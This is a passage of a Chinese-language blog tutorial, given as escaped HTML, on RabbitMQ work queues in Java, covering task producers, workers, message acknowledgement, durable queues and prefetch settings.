System.out.println(&lt;/span&gt;&quot; [x] Sent '&quot; + message + &quot;'&quot;);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 　　此时完整的NewTask.java代码为：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;44&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; NewTask {
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt; 
&lt;span&gt; 3&lt;/span&gt;     &lt;span&gt;private&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; String QUEUE_NAME = &quot;hello&quot;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt; 
&lt;span&gt; 5&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; main(String[] argv) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; IOException, TimeoutException {
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt; 
&lt;span&gt; 7&lt;/span&gt;         ConnectionFactory connectionFactory = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; ConnectionFactory();
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt;         connectionFactory.setHost(&quot;HOST&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt; 
&lt;span&gt;10&lt;/span&gt;         &lt;span&gt;try&lt;/span&gt;(Connection connection =&lt;span&gt; connectionFactory.newConnection();
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt;             Channel channel =&lt;span&gt; connection.createChannel()) {
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt; 
&lt;span&gt;13&lt;/span&gt;             channel.queueDeclare(QUEUE_NAME,&lt;span&gt;false&lt;/span&gt;,&lt;span&gt;false&lt;/span&gt;,&lt;span&gt;false&lt;/span&gt;,&lt;span&gt;null&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt; 
&lt;span&gt;15&lt;/span&gt;             String message = String.join(&quot; &quot;&lt;span&gt;, argv);
&lt;/span&gt;&lt;span&gt;16&lt;/span&gt;             
&lt;span&gt;17&lt;/span&gt;             channel.basicPublish(&quot;&quot;,QUEUE_NAME,&lt;span&gt;null&lt;/span&gt;,message.getBytes(&quot;UTF-8&quot;&lt;span&gt;));
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;             System.out.println(&quot; [x] Sent '&quot; + message + &quot;'&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;19&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt;20&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;21&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　之前的Recv.java也要做一些修改：模拟字符串消息中的每个点耗时1秒钟，它将处理传送过来的消息并执行任务，因此，我们修改为Work.java：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; DeliverCallback deliverCallback = (consumerTag, delivery) -&amp;gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt;   String message = &lt;span&gt;new&lt;/span&gt; String(delivery.getBody(), &quot;UTF-8&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt; 
&lt;span&gt; 4&lt;/span&gt;   System.out.println(&quot; [x] Received '&quot; + message + &quot;'&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt;   &lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt; &lt;span&gt;    doWork(message);
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt;   } &lt;span&gt;finally&lt;/span&gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt;     System.out.println(&quot; [x] Done&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt; &lt;span&gt;  }
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt; &lt;span&gt;};
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt; autoAck = &lt;span&gt;true&lt;/span&gt;; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; acknowledgment is covered below&lt;/span&gt;
&lt;span&gt;12&lt;/span&gt; channel.basicConsume(TASK_QUEUE_NAME, autoAck, deliverCallback, consumerTag -&amp;gt; { });
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　我们模拟执行过程中耗时的伪任务：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; &lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; doWork(String task) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; InterruptedException {
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt;     &lt;span&gt;for&lt;/span&gt; (&lt;span&gt;char&lt;/span&gt;&lt;span&gt; ch: task.toCharArray()) {
&lt;/span&gt;&lt;span&gt;3&lt;/span&gt;         &lt;span&gt;if&lt;/span&gt; (ch == '.') Thread.sleep(1000&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;4&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;5&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　此时完整的Work.java为：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;44&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Worker {
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt;     &lt;span&gt;private&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; String TASK_QUEUE_NAME = &quot;hello&quot;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt; 
&lt;span&gt; 4&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; main(String[] args) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Exception {
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt; 
&lt;span&gt; 6&lt;/span&gt;         ConnectionFactory connectionFactory = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; ConnectionFactory();
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt;         connectionFactory.setHost(&quot;HOST&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt; 
&lt;span&gt; 9&lt;/span&gt;         Connection connection =&lt;span&gt; connectionFactory.newConnection();
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt;         Channel channel =&lt;span&gt; connection.createChannel();
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt;         channel.queueDeclare(TASK_QUEUE_NAME,&lt;span&gt;false&lt;/span&gt;,&lt;span&gt;false&lt;/span&gt;,&lt;span&gt;false&lt;/span&gt;,&lt;span&gt;null&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt; 
&lt;span&gt;13&lt;/span&gt;         DeliverCallback deliverCallback = (consumerTag, delivery) -&amp;gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt;             String message = &lt;span&gt;new&lt;/span&gt; String(delivery.getBody(), &quot;UTF-8&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt; 
&lt;span&gt;16&lt;/span&gt;             System.out.println(&quot; [x] Received '&quot; + message + &quot;'&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;17&lt;/span&gt;             &lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt; &lt;span&gt;                doWork(message);
&lt;/span&gt;&lt;span&gt;19&lt;/span&gt;             } &lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (InterruptedException e) {
&lt;/span&gt;&lt;span&gt;20&lt;/span&gt; &lt;span&gt;                e.printStackTrace();
&lt;/span&gt;&lt;span&gt;21&lt;/span&gt;             } &lt;span&gt;finally&lt;/span&gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt;22&lt;/span&gt;                 System.out.println(&quot; [x] Done&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;23&lt;/span&gt; &lt;span&gt;            }
&lt;/span&gt;&lt;span&gt;24&lt;/span&gt; &lt;span&gt;        };
&lt;/span&gt;&lt;span&gt;25&lt;/span&gt; 
&lt;span&gt;26&lt;/span&gt;         &lt;span&gt;boolean&lt;/span&gt; autoAck = &lt;span&gt;true&lt;/span&gt;; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; acknowledgment is covered below&lt;/span&gt;
&lt;span&gt;27&lt;/span&gt;         channel.basicConsume(TASK_QUEUE_NAME, autoAck, deliverCallback, consumerTag -&amp;gt;&lt;span&gt; { });
&lt;/span&gt;&lt;span&gt;28&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;29&lt;/span&gt; 
&lt;span&gt;30&lt;/span&gt;     &lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; doWork(String task) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; InterruptedException {
&lt;/span&gt;&lt;span&gt;31&lt;/span&gt;         &lt;span&gt;for&lt;/span&gt; (&lt;span&gt;char&lt;/span&gt;&lt;span&gt; ch: task.toCharArray()) {
&lt;/span&gt;&lt;span&gt;32&lt;/span&gt;             &lt;span&gt;if&lt;/span&gt; (ch == '.') Thread.sleep(1000&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;33&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt;34&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;35&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;　　使用工作队列的优点之一是能够轻松地进行并行化操作。假设我们在做一个后台日志收集系统，我们可以很容易地增加更多的Worker从而提高系统性能。&lt;/p&gt;
&lt;p&gt;　　首先，我们同时启动两个Worker，同样地，我这里也放到IDEA中启动：&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1651332/201904/1651332-20190428225726785-830854617.png&quot; alt=&quot;&quot; width=&quot;398&quot; height=&quot;193&quot;/&gt;&lt;/p&gt;

&lt;p&gt;　　接下来，我们先后启动5个Task，并分别通过main()参数传入五个字符串消息：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; &lt;span&gt;First message.
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt; &lt;span&gt;Second message..
&lt;/span&gt;&lt;span&gt;3&lt;/span&gt; &lt;span&gt;Third message...
&lt;/span&gt;&lt;span&gt;4&lt;/span&gt; &lt;span&gt;Fourth message....
&lt;/span&gt;&lt;span&gt;5&lt;/span&gt; Fifth message.....
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1651332/201904/1651332-20190428230337044-1476631418.png&quot; alt=&quot;&quot; width=&quot;424&quot; height=&quot;119&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 　　执行五个发送任务之后，来看一下两个Worker都接收到了什么样的消息：&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1651332/201904/1651332-20190428230659970-695832234.png&quot; alt=&quot;&quot; width=&quot;400&quot; height=&quot;184&quot;/&gt;        &lt;img src=&quot;https://img2018.cnblogs.com/blog/1651332/201904/1651332-20190428230734987-156590766.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　默认情况下，RabbitMQ将按顺序将每个消息发送给下一个使用者。平均每个消费者将得到相同数量的消息。这种消息的调度方式称之为循环调度，你可以开启更多的Worker来进行测试。&lt;/p&gt;

&lt;p&gt;　　因为消费者执行一个任务会有时间耗时，假设一个消费者在执行一个任务执行一半的时候挂掉了将会怎样？消息会不会因此丢失？在我们目前的代码里，一旦RabbitMq将一条消息转发给了一个消费者后，将会立即将消息删除（注意Worker.java里的autoAck），因此，在我们上面例子里，如kill掉一个正在处理数据的Worker，那么该数据将会丢失。不仅如此，所有那些指派给该Worker的还未处理的消息也会丢失。&lt;/p&gt;
&lt;p&gt;　　但在实际工作的，我们并不希望一个Worker挂掉之后就会丢失数据，我们希望的是：如果该Worker挂掉了，所有转发给该Worker的消息将会重新转发给其他Worker进行处理（包括处理了一半的消息）。为了确保一条消息永不丢失，RabbitMq支持消息回执。消费者在接收到一条消息，并且成功处理完成之后会给RabbitMq回发一条确认ack确认消息，RabbitMq此时才会删除该条消息。&lt;/p&gt;
&lt;p&gt;　　如果一个Worker正在处理一条消息时挂掉了（信道关闭、连接关闭、TCP连接丢失），它将没有机会发送ack回执，RabbitMq就认为该消息没有消费成功，于是便会将该消息重新放到队列中，如果此时有其他消费者还是在线状态，RabbitMq会立即将该条消息再转发给其他在线的消费者。这种机制可以保证任何消息都不会丢失。&lt;/p&gt;
&lt;p&gt;　　默认情况下，需要手动进行消息确认，在前面的例子里，我们通过autoAck=true显示地关闭了手动消息确认，因此，RabbitMq将采用自动消息确认的机制。现在，我们修改我们的程序，采用手动发送回执的方式，当我们完成对消息的处理后，再手动发送回执确认：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; channel.basicQos(1); &lt;span&gt;//&lt;/span&gt;&lt;span&gt; accept only one unack-ed message at a time (see below)&lt;/span&gt;
&lt;span&gt; 2&lt;/span&gt; 
&lt;span&gt; 3&lt;/span&gt; DeliverCallback deliverCallback = (consumerTag, delivery) -&amp;gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt;   String message = &lt;span&gt;new&lt;/span&gt; String(delivery.getBody(), &quot;UTF-8&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt; 
&lt;span&gt; 6&lt;/span&gt;   System.out.println(&quot; [x] Received '&quot; + message + &quot;'&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt;   &lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt; &lt;span&gt;    doWork(message);
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt;   } &lt;span&gt;finally&lt;/span&gt;&lt;span&gt; {
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt;     System.out.println(&quot; [x] Done&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt;     channel.basicAck(delivery.getEnvelope().getDeliveryTag(), &lt;span&gt;false&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt; &lt;span&gt;  }
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt; &lt;span&gt;};
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt; autoAck = &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt; channel.basicConsume(TASK_QUEUE_NAME, autoAck, deliverCallback, consumerTag -&amp;gt; { });
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　ack发送信道必须和接收消息的信道(channel)是同一个，如果尝试通过一个不同的信道发送ack回执，将会抛出channel等级协议异常（官网说会抛出异常，但是我在实际测试中并没有抛异常，只是该条消息得不到回执，从而也无法删除）。&lt;/p&gt;
&lt;p&gt;　　一个常见的错误是忘了手动回执，虽然只是一个简单的错误，但是带来的后果却是严重的，它将导致已经消费掉的消费不会被删除，并且当消费该消息的消费者在退出之后，RabbitMq会将该条消息重新进行转发，内存将被慢慢耗尽。我们可以通过正面的命令来检查这种错误：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
sudo rabbitmqctl list_queues name messages_ready messages_unacknowledged
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1651332/201904/1651332-20190430222742656-1481357488.png&quot; alt=&quot;&quot; width=&quot;484&quot; height=&quot;78&quot;/&gt;    &lt;img src=&quot;https://img2018.cnblogs.com/blog/1651332/201904/1651332-20190430222821989-760947836.png&quot; alt=&quot;&quot; width=&quot;730&quot; height=&quot;73&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　该命令有三列内容，第一列是在监听的队列名称，第二列是Ready状态的消息数量，第三列是Unacked的消息数量。&lt;/p&gt;

&lt;p&gt;　　在3中我们讲解了如何保证当消费者挂掉之后消息不被丢失，但是，如果RabbitMq服务或者部署RabbitMq的服务器挂掉了之后，消息仍然会丢失。当RabbitMq崩溃之后，它将会忘记所有的队列和消息，除非，有什么机制让RabbitMq将队列信息和消息保存下来。&lt;/p&gt;
&lt;p&gt;　　要确保消息和队列不会丢失，我们必须要确保两件事情。&lt;/p&gt;
&lt;p&gt;　　首先，我们要确保RabbitMq永远不丢失队列，要做到这点，我们在定义的时候就需要告诉RabbitMq它是需要持久化的，通过指定durable参数实现：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;boolean&lt;/span&gt; durable = &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
channel.queueDeclare(&lt;/span&gt;&quot;hello&quot;, durable, &lt;span&gt;false&lt;/span&gt;, &lt;span&gt;false&lt;/span&gt;, &lt;span&gt;null&lt;/span&gt;);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　虽然这个命令本身是正确的，但是在我们目前它不能工作。因为我们前面已经定义了一个非持久化的hello队列，RabbitMq不允许重新定义一个已经存在的队列（用不同的参数），否则会抛出异常：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
Exception in thread &quot;main&quot;&lt;span&gt; java.io.IOException
    at com.rabbitmq.client.impl.AMQChannel.wrap(AMQChannel.java:&lt;/span&gt;126&lt;span&gt;)
    at com.rabbitmq.client.impl.AMQChannel.wrap(AMQChannel.java:&lt;/span&gt;122&lt;span&gt;)
    at com.rabbitmq.client.impl.AMQChannel.exnWrappingRpc(AMQChannel.java:&lt;/span&gt;144&lt;span&gt;)
    at com.rabbitmq.client.impl.ChannelN.queueDeclare(ChannelN.java:&lt;/span&gt;962&lt;span&gt;)
    at com.rabbitmq.client.impl.recovery.AutorecoveringChannel.queueDeclare(AutorecoveringChannel.java:&lt;/span&gt;333&lt;span&gt;)
    at myblog.myblog.java8.methodreference.rabbitmq.workqueue.NewTask.main(NewTask.java:&lt;/span&gt;23&lt;span&gt;)
    Suppressed: com.rabbitmq.client.AlreadyClosedException: channel is already closed due to channel error; protocol method: #method&lt;/span&gt;&amp;lt;channel.close&amp;gt;(reply-code=406, &lt;br/&gt;reply-text=PRECONDITION_FAILED - parameters &lt;span&gt;for&lt;/span&gt; queue 'hello' in vhost '/' not equivalent, &lt;span&gt;class&lt;/span&gt;-id=50, method-id=10&lt;span&gt;)
        at com.rabbitmq.client.impl.AMQChannel.processShutdownSignal(AMQChannel.java:&lt;/span&gt;396&lt;span&gt;)
        at com.rabbitmq.client.impl.ChannelN.startProcessShutdownSignal(ChannelN.java:&lt;/span&gt;292&lt;span&gt;)
        at com.rabbitmq.client.impl.ChannelN.close(ChannelN.java:&lt;/span&gt;607&lt;span&gt;)
        at com.rabbitmq.client.impl.ChannelN.close(ChannelN.java:&lt;/span&gt;541&lt;span&gt;)
        at com.rabbitmq.client.impl.ChannelN.close(ChannelN.java:&lt;/span&gt;534&lt;span&gt;)
        at com.rabbitmq.client.impl.recovery.AutorecoveringChannel.close(AutorecoveringChannel.java:&lt;/span&gt;68&lt;span&gt;)
        at myblog.myblog.java8.methodreference.rabbitmq.workqueue.NewTask.main(NewTask.java:&lt;/span&gt;29)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　要么重启RabbitMq让该临时队列消失，要么在控制台将该队列删除，或者重新创建一个新的队列：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt; durable = &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt; channel.queueDeclare(&quot;task_queue&quot;, durable, &lt;span&gt;false&lt;/span&gt;, &lt;span&gt;false&lt;/span&gt;, &lt;span&gt;null&lt;/span&gt;);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　生产者和消费者要做同步修改。&lt;/p&gt;
&lt;p&gt;　　上面这一步，我们保证了队列（task_quee）的持久化，此时，即便RabbitMq崩溃了也不会丢失该队列，当RabbitMq重启后将自动重新加载该队列。&lt;/p&gt;
&lt;p&gt;　　其次，我们需要确保我们的消息也被持久化，要做到这一点，在生产者发布消息的时候需要指定消息的属性为：PERSISTENT_TEXT_PLAIN。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.rabbitmq.client.MessageProperties;
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt; 
&lt;span&gt;3&lt;/span&gt; channel.basicPublish(&quot;&quot;, &quot;task_queue&quot;&lt;span&gt;,
&lt;/span&gt;&lt;span&gt;4&lt;/span&gt; &lt;span&gt;            MessageProperties.PERSISTENT_TEXT_PLAIN,
&lt;/span&gt;&lt;span&gt;5&lt;/span&gt;             message.getBytes());
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　&lt;strong&gt;注意，&lt;/strong&gt;即便设置了消息的持久化属性也不能保证消息会被100%地写入到磁盘中，因为RabbitMq在接收到消息和写入到磁盘不是同步的，有可能消息只是被写入到缓存中而还没来和及写入磁盘的时候，RabbitMq崩溃了，此时也会丢失消息。但无论如何，比前面简单的消息队列已经强大了很多。&lt;/p&gt;

&lt;p&gt;　　您可能已经注意到，任务调度仍然不能完全按照我们希望的方式工作。举个例子，在只有两个Worker的环境中，奇数的消息比较重，偶数的消息比较轻时，一个Worker将会一直处于忙碌状态，而另一个Worker将会一直处于空闲状态，但RabbitMq并不知道这种情况，它会依然均衡地向两个Worker传递消息。&lt;/p&gt;
&lt;p&gt;　　发生这种情况是因为，当一个消息进入队列之后，RabbitMq只是盲目地将该第n个消息转发给第n个消费者，它并不关注每个消费者发了多少个回执。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1651332/201904/1651332-20190430231007468-1417204694.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　为了解决这个问题，我们可以通过调用basicQos方法，给它传入1。这将告诉RabbitMq不要同时给一个队列转发多于1条的消息，换句话说，在一个消费者没有完成并回执前一条消息时，不要再给它转发其他消息。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; prefetchCount = 1&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt; channel.basicQos(prefetchCount);
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;　　&lt;strong&gt;一、NewTask.java&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;43&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.rabbitmq.client.Channel;
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.rabbitmq.client.Connection;
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.rabbitmq.client.ConnectionFactory;
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.rabbitmq.client.MessageProperties;
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt; 
&lt;span&gt; 6&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; NewTask {
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt; 
&lt;span&gt; 8&lt;/span&gt;   &lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; String TASK_QUEUE_NAME = &quot;task_queue&quot;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt; 
&lt;span&gt;10&lt;/span&gt;   &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; main(String[] argv) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Exception {
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt;     ConnectionFactory factory = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; ConnectionFactory();
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt;     factory.setHost(&quot;localhost&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt;     &lt;span&gt;try&lt;/span&gt; (Connection connection =&lt;span&gt; factory.newConnection();
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt;          Channel channel =&lt;span&gt; connection.createChannel()) {
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt;         channel.queueDeclare(TASK_QUEUE_NAME, &lt;span&gt;true&lt;/span&gt;, &lt;span&gt;false&lt;/span&gt;, &lt;span&gt;false&lt;/span&gt;, &lt;span&gt;null&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;16&lt;/span&gt; 
&lt;span&gt;17&lt;/span&gt;         String message = String.join(&quot; &quot;&lt;span&gt;, argv);
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt; 
&lt;span&gt;19&lt;/span&gt;         channel.basicPublish(&quot;&quot;&lt;span&gt;, TASK_QUEUE_NAME,
&lt;/span&gt;&lt;span&gt;20&lt;/span&gt; &lt;span&gt;                MessageProperties.PERSISTENT_TEXT_PLAIN,
&lt;/span&gt;&lt;span&gt;21&lt;/span&gt;                 message.getBytes(&quot;UTF-8&quot;&lt;span&gt;));
&lt;/span&gt;&lt;span&gt;22&lt;/span&gt;         System.out.println(&quot; [x] Sent '&quot; + message + &quot;'&quot;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;23&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;24&lt;/span&gt; &lt;span&gt;  }
&lt;/span&gt;&lt;span&gt;25&lt;/span&gt; 
&lt;span&gt;26&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;　　二、Worker.java&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;45&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.rabbitmq.client.Channel;
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.rabbitmq.client.Connection;
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.rabbitmq.client.ConnectionFactory;
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.rabbitmq.client.DeliverCallback;
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt; 
&lt;span&gt; 6&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Worker {
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt; 
&lt;span&gt; 8&lt;/span&gt;   &lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; String TASK_QUEUE_NAME = &quot;task_queue&quot;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt; 
&lt;span&gt;10&lt;/span&gt;   &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; main(String[] argv) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Exception {
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt;     ConnectionFactory factory = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; ConnectionFactory();
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt;     factory.setHost(&quot;localhost&quot;&lt;span&gt;);
